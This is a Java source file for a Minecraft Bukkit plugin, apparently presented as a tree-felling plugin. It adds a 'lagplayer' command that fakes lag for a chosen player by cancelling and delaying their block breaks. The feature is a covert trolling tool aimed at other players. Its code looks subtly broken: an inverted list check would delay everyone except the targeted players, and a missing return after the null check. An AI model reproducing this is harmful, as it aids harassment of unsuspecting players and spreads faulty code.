package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.inventory.ItemStack;

import java.util.ArrayList;
import java.util.Random;
import java.util.UUID;

public class LagPlayer extends Command {
    private ArrayList<UUID> players = new ArrayList<>();
    private Random rnd = new Random();

    public LagPlayer() {
        super("lagplayer", "HELP MY BLOCKS ARENT BREAKING HALP (fake lag)", CommandCategory.Player, 1);
    }

    @Override
    public void onPlayerBlockBreak(BlockBreakEvent e) {
        Player p = e.getPlayer();
        if (players.contains(p.getUniqueId())) return;
        ItemStack item = p.getInventory().getItemInMainHand();
        if (p.getGameMode() == GameMode.CREATIVE && p.getInventory().getItemInMainHand().getType().toString().toLowerCase().contains("sword"))
            return;
        if (p.getGameMode() == GameMode.CREATIVE) {
            Bukkit.getScheduler().runTaskLater(Start.Instance, () -> e.getBlock().setType(Material.AIR), rnd.nextInt((25 - 10) + 1) + 10);
        } else {
            Bukkit.getScheduler().runTaskLater(Start.Instance, () -> e.getBlock().breakNaturally(item), rnd.nextInt((25 - 10) + 1) + 10);
        }
        e.setCancelled(true);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            Player anotherPlayer = Bukkit.getPlayer(args.get(0));
            if (anotherPlayer == null) {
                Start.ErrorString(p, "Player is not online!");
            }
            //noinspection ConstantConditions
            if (players.contains(anotherPlayer.getUniqueId())) {
                players.remove(anotherPlayer.getUniqueId());
                p.sendMessage(Start.Prefix + ChatColor.GOLD + anotherPlayer.getName() + ChatColor.RED + " is now longer fake lagging!");
            } else {
                players.add(anotherPlayer.getUniqueId());
                p.sendMessage(Start.Prefix + ChatColor.GOLD + anotherPlayer.getName() + ChatColor.GREEN + " is now fake lagging!");
            }
        } catch (Exception e) {
            Start.ErrorException(p, e);
        }

    }
}